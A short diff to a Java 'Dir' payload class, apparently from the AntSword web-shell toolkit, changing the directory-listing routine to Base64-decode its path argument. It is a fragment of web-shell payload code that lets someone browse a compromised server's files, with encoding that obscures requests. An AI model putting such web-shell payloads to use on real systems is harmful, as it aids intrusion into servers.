@@ -11,7 +11,7 @@ public class Dir extends Template {
     public String run() throws Exception {
 
         cs = String.valueOf(Charset.forName(System.getProperty("sun.jnu.encoding")));
-        String z1 = getParam("antswordargpath");
+        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
         return FileTreeCode(z1);
 
     }
